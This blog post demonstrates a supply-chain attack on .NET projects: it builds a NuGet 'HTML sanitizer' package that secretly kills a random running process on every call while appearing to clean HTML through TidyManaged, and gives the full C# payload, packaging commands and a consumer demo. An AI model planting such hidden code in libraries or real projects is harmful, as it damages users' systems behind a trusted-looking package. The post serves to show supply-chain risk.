---
layout: post
title: Bad NuGets everywhere
tags: [dotnet, tech]
---
It's quite funny how easy it is to create a "bad NuGet package" and distribute it through a package repository, by bad meaning a package which damages the system in one way or another. Granted the [NuGet Gallery](https://www.nuget.org/) scans a given package for viruses and bad intent prior to making the package public, however, if you have set up a custom NuGet Gallery for your project you could essentially upload packages that are bad.

To demonstrate this, in the following steps, we will create an HTML sanitizer package that cleans HTML code in addition to killing a process at random. The package which we will create uses [HTMLTidy](https://github.com/markbeaton/TidyManaged) under the roof, so that to the user it will look like HTML code is being cleaned as it should.

We create a static <code>Sanitizer</code> class with one public method <code>SanitizeHtml</code>:

```csharp
public static string SanitizeHtml(string input)
{
    KillRandomProcess();
    return SanitizeUsingHtmlTidy(input);
}
```

This method kills a process at random, then proceeds to clean the HTML input. Killing a process at random is straightforward; fetch all process IDs into a list, then randomly fetch a process by ID from the IDs list. Then proceed to kill that process:

```csharp
private static void KillRandomProcess()
{
    var processIds = Process.GetProcesses().Select(x => x.Id).ToList();
    var random = new Random();
    var randomProcess = Process.GetProcessById(processIds[random.Next(processIds.Count)]);
    try
    {
        randomProcess.Kill();
        randomProcess.WaitForExit();
        randomProcess.Dispose();
    }
    catch (Exception e)
    {
        KillRandomProcess();
    }
}
```

The reason that we use a try-catch (and call the method again inside the catch) is that sometimes we are denied access to kill a given process:

[<img src="{{ site.url }}/public/img/access_is_denied.png">]({{ site.url }}/public/img/access_is_denied.png)

Sanitizing the HTML input is done using [HTMLTidy](https://github.com/markbeaton/TidyManaged):

```csharp
private static string SanitizeUsingHtmlTidy(string input)
{
    string output;
    using (Document doc = Document.FromString(input))
    {
        doc.ShowWarnings = false;
        doc.Quiet = true;
        doc.OutputXhtml = true;
        doc.CleanAndRepair();
        output = doc.Save();
    }
    return output;
}
```

Now that the class is in order, we are ready to transform it into a NuGet package. Make sure [NuGet.exe](https://dist.nuget.org/win-x86-commandline/latest/nuget.exe) is installed and added to path. Start up cmd and:

1. nuget spec Sanitizer.csproj
2. Edit nuspec file accordingly
3. nuget pack Sanitizer.csproj

Now let's install and use the NuGet package we just created. Start a new Console Application solution, right click solution and choose "Manage NuGet Packages for Solution...". Add a local package source that contains the package then install the package:

[<img src="{{ site.url }}/public/img/local_package_source.png">]({{ site.url }}/public/img/local_package_source.png)

Now that the NuGet package is installed, we can start using it:

```csharp
public class Program
{
    static void Main(string[] args)
    {
        var output = Sanitizer.Sanitizer.SanitizeHtml("<div>Hello world!</div><div>");
    }
}
```

Take a look at the number of processes currently running using PowerShell and you will see that the number drops each time the method is called:

[<img src="{{ site.url }}/public/img/powershell_process_count.png">]({{ site.url }}/public/img/powershell_process_count.png)

And voilà, we installed a bad NuGet package locally in our system.

